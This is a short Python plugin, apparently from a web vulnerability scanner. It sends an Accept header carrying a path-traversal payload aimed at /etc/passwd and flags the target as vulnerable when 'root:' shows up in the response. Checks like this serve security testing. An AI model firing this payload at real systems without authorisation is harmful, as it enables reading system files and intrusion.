#!/usr/bin/env python3
from requests import get
from urllib.parse import urlparse
from libs import good
import sys


def scan(host):
    try:
        payloads = {
                'Accept ../../../../../../../../../../etc/passwd{{':'root:',
        } # add your headers payload here
        # Host: localhost >> {'Host localhost':'Apache'}
        for payload,msg in payloads.items():
            r = get(host,headers={payload.split(' ')[0]:payload.split(' ')[1]},verify=False,allow_redirects=False)
            if r != 0:
                try:
                    if msg.encode() in r.content:
                        print(f"""{good} Found :> {host} | {payload.split(' ')[0]+": "+payload.split(' ')[1]}""")
                finally:
                    pass
    except:
        pass


def main(opts):
    scan(opts['url'])
